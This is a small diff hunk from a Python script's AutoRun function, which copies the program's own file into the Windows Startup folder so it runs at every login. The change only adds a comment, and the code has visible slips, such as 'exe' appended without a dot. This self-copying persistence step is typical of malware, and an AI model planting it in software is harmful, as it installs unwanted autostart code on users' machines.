@@ -9,7 +9,7 @@ def AutoRun():
 
     file = os.path.basename(sys.argv[0])
     file = re.sub(".py", "", file)
-    file = file + "exe"
+    file = file + "exe" # If you will compile file as exe
 
     try:
         shutil.copy(file, "D:\\Users\\%s\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup" % name)
